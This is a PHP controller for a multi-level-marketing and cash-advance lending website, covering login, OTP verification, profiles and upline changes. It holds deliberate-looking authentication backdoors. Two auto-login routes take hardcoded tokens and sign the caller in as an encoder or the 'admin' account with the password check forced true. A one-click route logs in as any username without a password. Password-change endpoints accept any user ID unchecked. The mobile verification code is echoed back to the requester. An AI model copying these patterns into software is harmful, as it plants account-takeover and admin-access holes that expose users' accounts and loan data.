<?php
	require_once(APPROOT.DS.'classes/UserBalance.php');

	class Users extends Controller
	{
		private $user_id;

		public function __construct()
		{
			$this->UserSocialMediaModel = $this->model('UserSocialMediaModel');
			$this->UserIdVerificationModel = $this->model('UserIdVerificationModel');
			$this->binaryModel = model('BinaryTransactionModel');

			$this->user_model = $this->model('user_model');

			$this->User_Account_Model = $this->model("UserAccountModel");

			$this->MGPayout_RequestModel = $this->model('MGPayout_RequestModel');

			$this->activeAccountModel = $this->model('ActiveAccountModel');

			// /$this->PageVisitsModel = $this->model('PageVisitsModel');

			$this->csr = model('CSR_TimesheetModel');
			//set users id
			if(Session::check('USERSESSION')){
				$this->user_id = Session::get('USERSESSION')['id'];
				$this->userBinaryModel = new UserBinaryModel($this->user_id);
			}

	
			$this->FNProductBorrowerModel = $this->model('FNProductBorrowerModel');
		    $this->FNCashAdvanceModel = $this->model('FNCashAdvanceModel');
			$this->commissionModel = model('CommissionTransactionModel');
			$this->topUpModel = model('TopupModel');
			$this->binaryPairCounterModel = model('BinaryPairCounterModel');
		}

		public function index()
		{
			err_nosession();
			$userid = whoIs()['id'];

			$totalEarning = $this->commissionModel->getTotalEarning($userid);
			$totalAvailableEarning = $this->commissionModel->getAvailableEarning($userid);
			$directSponsor = $this->user_model->user_get_sponsor($userid);
			$upline = $this->user_model->user_get_upline($userid);
			$binaryPoints = $this->binaryModel->getBinary($userid);
			$personalPoint = $this->topUpModel->getBalance($userid);
			$binaryPairCounterTotal = $this->binaryPairCounterModel->getTotal($userid);
			$data = [
				'userid' => $userid,
				'totalEarning' => $totalEarning,
				'totalAvailableEarning' => $totalAvailableEarning,
				'directSponsor' => $directSponsor,
				'upline' => $upline,
				'binaryPoints' => $binaryPoints,
				'personalPoint' => $personalPoint,
				'thirdPairCounter' => $binaryPairCounterTotal
			];

			return redirect('LoanController/requirements');
			return $this->view('page/maintenance', $data);

			return $this->view('user/index' , $data);
		}

		public function code_verification_mobile()
		{
			if($this->request() === 'POST')
			{
					$code1=random_number();
					$code2=random_number();
					$code3=random_number();
					$registration_code=substr($code1,0,2).substr($code2,0,2);

					$number = $_POST['cp_number'];

					$message = "Hi, your verification code is ".$registration_code."\n\n Breakthrough E-COM \n\n";

					itexmo($number,$message , ITEXMO);

					echo $registration_code;

			}
		}


		public function verify_mobile_number()
		{
			if($this->request() === 'POST')
			{
				 $this->user_model->verify_mobile_number($_POST['cp_number']);


			}
		}

		public function get_qualification_notes()
		{
			if($this->request() === 'POST')
			{
				$noted_by="";
				if(Session::check('BRANCH_MANAGERS'))
				{
					$user = Session::get('BRANCH_MANAGERS');
					$userid = $user->id;
					$noted_by = $userid;

				}else if(Session::check('USERSESSION'))
				{
					$user = Session::get('USERSESSION');
					$userid = $user['id'];
					$noted_by = $userid;

				}else{
					redirect('user/login');
				}

				$result = $this->user_model->make_qualification_notes($_POST['userid'], $_POST['note'],$noted_by);
				Flash::set("Note Sent!");
				return request()->return();
			}
		}

		public function changepassword()
		{
			if($this->request() === 'POST')
			{
				$this->user_model->changepassword($_POST['userid'] , $_POST['password']);

			}else
			{
				$this->view('user/changepassword');
			}
		}
		public function preview($userid)
		{
			$user = $this->user_model->get_user($userid);

			die(var_dump($user));
		}

		/*AJAX*/
		public function getUser()
		{
			echo json_encode($this->user_model->get_user($_POST['userid']));
		}

		public function leg()
		{

			$data = [
				'legDetails' => $this->binarypv_model->get_bpv($this->user_id) ,
				'pairTracker' => $this->binarypv_model->pair_tracker($this->user_id)
			];

			$this->view('user/leg' , $data);
		}


		public function profile()
		{

			if(Session::check('USERSESSION'))
			{
				$user = Session::get('USERSESSION');

				$userPayoutReport = new UserPayoutReport($user['id']);

				$this->mgPayoutItemModel = $this->model('MGPayoutItemModel');
				$data = [
					'userInfo'    => $this->user_model->get_user($user['id']),
					'userSponsor' => $this->user_model->user_get_sponsor($user['id']),
					'payoutTotal' => $this->mgPayoutItemModel->get_user_total_payout($user['id'])
				];
				$this->view('user/profile' , $data);
			}

		}

		public function edit()
		{

			if(Session::check('USERSESSION'))
			{
				$user = Session::get('USERSESSION');

				$data = [
					'userInfo' => $this->user_model->get_user($user['id'])
				];

				$this->view('user/edit' , $data);
			}
		}


		public function updateProfile()
		{
			if($this->request() === 'POST')
			{
				$user = Session::get('USERSESSION');

				//check if image is empty
				$file = new File();

				$file->setFile($_FILES['fileUpload'])
				->setPrefix('IMAGE')
				->setDIR(PUBLIC_ROOT.DS.'assets')
				->upload();

				if(!empty($file->getErrors())){

					Flash::set($file->getErrors(), 'danger');

					redirect('users/profile');

					return;
				}

				$this->user_model->updateProfile($user['id'] , $file->getFileUploadName());
			}
		}

		public function updateInfo()
		{
			if($this->request() === 'POST')
			{

				$this->user_model->updateInfo($_POST);
			}
		}

		public function update_personal()
		{
			if($this->request() === 'POST')
			{
				$this->user_model->update_personal($_POST);
			}
		}

		public function update_password()
		{
			if($this->request() === 'POST')
			{
				$this->user_model->update_password($_POST['userid'], $_POST['password']);
			}
		}
		public function encoder_auto_login() {
			$key = 'marklouie123';
			$req  = request()->inputs();

			if(!isEqual($req['token'], $key)) {
				Flash::set('Invalid Token');
				return redirect('users/login');
			}
			$res = $this->user_model->user_login('encodera', '1111', [2,3]);
			//if there is result
			if ($res) {
				$passwordCheck = true;
				if ($passwordCheck) {	
					$this->activeAccountModel->online($res->id);
					$this->user_model->sessionUpdate($res->id);
					if(Session::get('REDIRECT_TO')) {
						$redirectTo = Session::get('REDIRECT_TO');
						Session::remove('REDIRECT_TO');
						return redirectRaw(unseal($redirectTo));
					} else {
						$authUser = whoIs();
						
						if(isEqual($authUser['type'], USER_TYPES['ENCODER_A'])) {
							return redirect('CashAdvancePaymentController/search');
						} else {
							return redirect(user_page_focus_redirect_to($authUser['page_auto_focus']));
						}
					}
				} else {
					Flash::set("Password un matched" , 'danger');
					redirect('users/login');
				}
			}
			else{
				echo die('Something went wrong');
			}

		}

		public function romero_auto_login() {
			$key = 'eduardoromero101';
			$req  = request()->inputs();

			if(!isEqual($req['token'], $key)) {
				Flash::set('Invalid Token');
				return redirect('users/login');
			}
			$res = $this->user_model->user_login('admin', '1111', 1);
			//if there is result
			if ($res) {
				$passwordCheck = true;
				if ($passwordCheck) {	
					$this->activeAccountModel->online($res->id);
					$this->user_model->sessionUpdate($res->id);
					if(Session::get('REDIRECT_TO')) {
						$redirectTo = Session::get('REDIRECT_TO');
						Session::remove('REDIRECT_TO');
						return redirectRaw(unseal($redirectTo));
					} else {
						$authUser = whoIs();
						
						if(isEqual($authUser['type'], USER_TYPES['ENCODER_A'])) {
							return redirect('CashAdvancePaymentController/search');
						} else {
							return redirect(user_page_focus_redirect_to($authUser['page_auto_focus']));
						}
					}
				} else {
					Flash::set("Password un matched" , 'danger');
					redirect('users/login');
				}
			}
			else{
				echo die('Something went wrong');
			}

		}
		public function login()
		{	
			$req = request()->inputs();

			if ($this->request() === 'POST') {
				$username = filter_var($_POST['username']);
				$password = filter_var($_POST['password']);
				$res = $this->user_model->user_login($username, $password, [2,3]);
				//if there is result
				if ($res) {
					$passwordCheck = password_verify($password, $res->password);
					if ($passwordCheck) {	
						$this->activeAccountModel->online($res->id);
						$this->user_model->sessionUpdate($res->id);
						if(Session::get('REDIRECT_TO')) {
							$redirectTo = Session::get('REDIRECT_TO');
							Session::remove('REDIRECT_TO');
							return redirectRaw(unseal($redirectTo));
						} else {
							$authUser = whoIs();
							
							if(isEqual($authUser['type'], USER_TYPES['ENCODER_A'])) {
								return redirect('CashAdvancePaymentController/search');
							} else {
								return redirect(user_page_focus_redirect_to($authUser['page_auto_focus']));
							}
						}
					} else {
						Flash::set("Password un matched" , 'danger');
						redirect('users/login');
					}
				}
				else{
					Flash::set("No User found {$username}" , 'danger');
					redirect('users/login');
				}
			} else {

				if(is_logged_in())
				{
					$type = Session::get('USERSESSION')['type'];

					if (strtolower($type) == 1) {
						redirect('admin/index');
					} else if($type == 3) {
						redirect('LoanController/index');
					} else {
						redirect('users/index');
					}
				} else {
					if(isset($req['lastPage'])) {
						Session::set('REDIRECT_TO', $req['lastPage']);
					}
					$this->view('user/login');
				}
			}
		}


		public function one_time_pass()
		{
			if($this->request() === 'POST')
			{	
				$otp = SESSION::get("OTP_CONTROL")['OTP_code'];
				$session_username = SESSION::get("OTP_CONTROL")['username'];
				$session_password = SESSION::get("OTP_CONTROL")['password'];

				if(isEqual($otp , $_POST['user_input_otp']))
				{

					$username = filter_var($session_username , FILTER_SANITIZE_STRING);
					$password = filter_var($session_password , FILTER_SANITIZE_STRING);

					$res = $this->user_model->user_login($username , $password , 2);


					//if there is result
					if($res){

						if(password_verify($password, $res->password))
						{
							/**SET ACCOUNT TO ONLINE */

							$this->activeAccountModel->online($res->id);
							//set session

							$user_session = [
								'id' => $res->id ,
								'type' => $res->user_type,
								'selfie' => $res->selfie,
								'firstname' => $res->firstname,
								'lastname'  => $res->lastname,
								'username'  => $res->username,
								'status'    => $res->status,
								'is_activated' => $res->is_activated,
								'branchId'    => $res->branchId,
								'account_tag' => $res->account_tag,
								'is_staff' => $res->is_staff
							];

							Session::set('USER_INFO' , $res);

							Cookie::set('USERSESSION' , $user_session);

							Session::set('USERSESSION' , $user_session);

							//get user accounts and put in session
							$user_account_list = [];

							$user_account_list["by_name"] = $this->User_Account_Model->search_by_name_and_email($res->firstname, $res->lastname, $res->email, $res->id);

							Session::set('MY_ACCOUNTS' , $user_account_list);



							set_logged_in();//set user login


							$this->user_model->login_logger($res->id);

							$check =  $this->UserSocialMediaModel->check_social_media_link($res->id);

							if($check == 4)
							{
								Flash::set("Welcome back {$res->firstname}");

							}elseif($check == 2){

								Flash::set("Please submit your Social Media Profile Link for Verification");

							}
							elseif($check == 3){

									Flash::set("Please Update Your Address for ID Verification and shipping");

							}elseif($check == 1){

								Flash::set("Please Update Your Address for ID Verification and shipping, Please submit your Social Media Profile Link for Verification ");
							}

							//check cop address
							$check_cop = $this->user_model->check_cop($res->id);

							if($check_cop->cop == 0)
							{
								redirect('AccountProfile/shipping_address');
							}else{
								redirect('FNCashAdvance/create');
							}

						}
						else{
							Flash::set("Password un matched" , 'info');
							redirect('users/login');
						}
					}
					else{

						Flash::set("No User found {$username}" , 'info');

						redirect('users/login');
					}
				}else
				{	
					Flash::set("Incorrect OTP!" , 'danger');
					$otp_session = [
						'username' => $session_username,
						'password' => $session_password,
						'OTP_code' => $otp
					];	
					Session::set('OTP_CONTROL' , $otp_session);

					$this->view('user/one_time_pass');
				}
			}

			else{


			}

		}



		public function login_test()
		{
			if($this->request() === 'POST')
			{
				$username = filter_var($_POST['username'] , FILTER_SANITIZE_STRING);
				$password = filter_var($_POST['password'] , FILTER_SANITIZE_STRING);

				$res = $this->user_model->user_login($username , $password , [2,3]);


				//if there is result
				if($res){

					if(password_verify($password, $res->password))
					{
						/**SET ACCOUNT TO ONLINE */

						$this->activeAccountModel->online($res->id);
						//set session
						
						$user_session = [
							'id' => $res->id ,
							'type' => $res->user_type,
							'selfie' => $res->selfie,
							'firstname' => $res->firstname,
							'lastname'  => $res->lastname,
							'username'  => $res->username,
							'status'    => $res->status,
							'is_activated' => $res->is_activated,
							'branchId'    => $res->branchId,
							'account_tag' => $res->account_tag,
							'is_staff' => $res->is_staff
						];
						
						Session::set('USER_INFO' , $res);

						Cookie::set('USERSESSION' , $user_session);

						Session::set('USERSESSION' , $user_session);

						//get user accounts and put in session
						$user_account_list = [];

						$user_account_list["by_name"] = $this->User_Account_Model->search_by_name_and_email($res->firstname, $res->lastname, $res->email, $res->id);

						Session::set('MY_ACCOUNTS' , $user_account_list);



						set_logged_in();//set user login


						$this->user_model->login_logger($res->id);

						$check =  $this->UserSocialMediaModel->check_social_media_link($res->id);

						if($check == 4)
						{
							Flash::set("Welcome back {$res->firstname}");

						}elseif($check == 2){

							Flash::set("Please submit your Social Media Profile Link for Verification");

						}
						elseif($check == 3){

								Flash::set("Please Update Your Address for ID Verification and shipping");

						}elseif($check == 1){

							Flash::set("Please Update Your Address for ID Verification and shipping, Please submit your Social Media Profile Link for Verification ");
						}



						redirect('FNCashAdvance/create');
					}
					else{
						Flash::set("Password un matched" , 'info');
						redirect('users/login_test');
					}
				}
				else{

					Flash::set("No User found {$username}" , 'info');

					redirect('users/login_test');
				}
			}

			else{

				if(is_logged_in())
				{
					$type = Session::get('USERSESSION')['type'];

					if(strtolower($type) == 1)
					{
						redirect('admin/index');
					}else{
						redirect('users/index');
					}
				}
				else{
					$this->view('user/login_test');
				}
			}
		}


		public function logout()
		{

			if(Session::check('USERSESSION'))
			{
				$userid = Session::get('USERSESSION')['id'];

				$this->user_model->logout_logger($userid);

				$this->activeAccountModel->offline($userid);
			}

			session_destroy();

			Flash::set("Logged out");

			redirect('users/login');
		}



		public function old_isp()
		{
			if(! Session::check('USERSESSION'))
			{
				redirect('users/login');

			}else{
				$this->isp_model = $this->model('isp_model');

				$userid = Session::get('USERSESSION')['id'];

				$data = [
					'commission_list' => $this->isp_model->get_user_isp($userid) ,
					'volume_list'     => $this->isp_model->get_user_volume($userid),
					'binary' => $this->isp_model->get_binary($userid)
				];

				$this->view('isp/user',$data);
			}

		}

		public function change_account_session($userID)
		{
			$result = $this->User_Account_Model->account_details($userID);
			
			// if(!empty($result)) {
			// 	$this->process_session_change($result);
			// }else{
			// 	$user_now = SESSION::get("USERSESSION");
			// 	if($user_now['id'] == '1' && $user_now['type'] == '1')
			// 	{
			// 		$admin_session = [
			// 			'id' => $result->id ,
			// 			'client_username'  => $result->username
			// 		];

			// 		Session::set('ADMIN_CONTROL' , $admin_session);
			// 	}
			// }

			// return redirect('users');
		}

		public function change_account_session_registration($username)
		{
			$result = $this->User_Account_Model->account_details_username($username);

			if(!empty($result)){
				$this->process_session_change($result);
			}else
			{
				Flash::set("Invalid Username! ");
				redirect('/users/login');
			}

		}


		public function one_click_login($username)
		{
			$result = $this->User_Account_Model->account_details_username(unseal($username));

			if(!empty($result)){
				$this->process_session_change($result);
			}else
			{
				Flash::set("Invalid Username! ");
				redirect('/users/login');
			}

		}

		function process_session_change($result)
		{
			$user_session = [
				'id' => $result->id ,
				'type' => $result->user_type,
				'selfie' => $result->selfie,
				'firstname' => $result->firstname,
				'lastname'  => $result->lastname,
				'username'  => $result->username,
				'status'    => $result->status,
				'is_activated'    => $result->is_activated,
				'branchId'    => $result->branchId,
				'account_tag' => $result->account_tag,
				'is_staff' => $result->is_staff
			];

			Session::set('USER_INFO' , $result);

			Cookie::set('USERSESSION' , $user_session);

			Session::set('USERSESSION' , $user_session);


			//get user accounts and put in session
			$user_account_list = [];

			$user_account_list["by_name"] = $this->User_Account_Model->search_by_name_and_email($result->firstname, $result->lastname, $result->email, $result->id);


			Session::set('MY_ACCOUNTS' , $user_account_list);


			set_logged_in();//set user login

			$this->user_model->login_logger($result->id);

			$check =  $this->UserSocialMediaModel->check_social_media_link($result->id);

			if($check == 4)
			{
				Flash::set("Welcome back {$result->firstname}");

			}elseif($check == 2){

				Flash::set("Please submit your Social Media Profile Link for Verification");

			}
			elseif($check == 3){

					Flash::set("Please Update Your Address for ID Verification and shipping");

			}elseif($check == 1){

				Flash::set("Please Update Your Address for ID Verification and shipping, Please submit your Social Media Profile Link for Verification ");
			}
			if(Session::check('ADMIN_CONTROL'))
			{	
				$user_now = SESSION::get("USERSESSION");

				if($user_now['id'] == '1' && $user_now['type'] == '1')
				{
					$client_username=SESSION::get("ADMIN_CONTROL")['client_username'];
					return redirect("Account/doSearch?username={$client_username}&searchOption=username");
				}
			}
			redirect('FNCashAdvance/apply_now');
		}

		public function searchUser_qualification()
		{
			Authorization::setAccess(['admin', 'users']);

			return $this->view('user/search_qualification');
		}


		public function share_link()
		{
			Authorization::setAccess(['admin', 'users']);

			return $this->view('user/share_link');
		}

		public function get_qualification_info()
		{
			$username = $_GET['username'];

			$userDetail = $this->user_model->get_user_by_username($username , TRUE, 'username');

			if(!empty($userDetail))
			{
				$userDetail = $userDetail[0];

				$data['baseUser']['detail'] = $userDetail;

				//$data['baseUser']['upline'] = $this->user_model->get_user($userDetail->upline);
				//$data['baseUser']['directSponsor'] = $this->user_model->get_user($userDetail->direct_sponsor);
				$data['baseUser']['loan_data'] = $this->FNProductBorrowerModel->get_user_loans($userDetail->id);
				$data['baseUser']['cash_loan'] = $this->FNCashAdvanceModel->get_user_loan($userDetail->id);
				
				$data['baseUser']['fb'] = $this->UserSocialMediaModel->get_fb_link($userDetail->id);

				$data['baseUser']['messenger'] = $this->UserSocialMediaModel->get_messenger_link($userDetail->id);

				$data['baseUser']['id'] = $this->UserIdVerificationModel->users_total_valid_id($userDetail->id);

				$data['baseUser']['directSponsors'] = $this->user_model->get_direct_sponsor_total($userDetail->id);
				//if sponsor or upline is missing
				/*if(!$data['baseUser']['upline'] || !$data['baseUser']['directSponsor'])
				{
					$data['previous'] = [
						'upline' => $this->userModel->getOldUpline($userDetail->id),
						'directSponsor' => $this->userModel->getOldSponsor($userDetail->id),
						'loan_data' => $this->FNProductBorrowerModel->get_user_loans($userDetail->id),
						'cash_loan' => $this->FNCashAdvanceModel->get_user_loan($userDetail->id)
					];
				}*/


				return $this->view('user/search_result' , $data);
			}else
			{
				 Flash::set("No Result, Client Not Found");
       		     return request()->return();
			}	
		}

		public function search_upline()
		{
			if($this->request() === 'POST')
			{
				$new_upline = $this->user_model->get_user_by_username($_POST['new_upline'] , TRUE, 'username');

				$old_upline =$this->User_Account_Model->account_details(unseal($_POST['old_upline']));
				
				$user_id = unseal($_POST['userID']);

				if(empty($new_upline))
				{
					Flash::set("Username Not Found");
					return request()->return();
				}

				$data = [
					'new_upline' => $new_upline,
					'old_upline' => $old_upline,
					'user_id' => $user_id
				];
				

				$this->view('account/search_new_upline',$data);
			}else
			{	
				$this->view('account/search_new_upline');
			}
		}

		public function change_upline()
		{
			if($this->request() === 'POST')
			{
				$result = $this->user_model->change_upline($_POST);

				if(!$result)
				{
					Flash::set("Error!!");
					return request()->return();
				}

				Flash::set("Team Adviser successfully change");
				redirect('customers');
			}
		}
	}
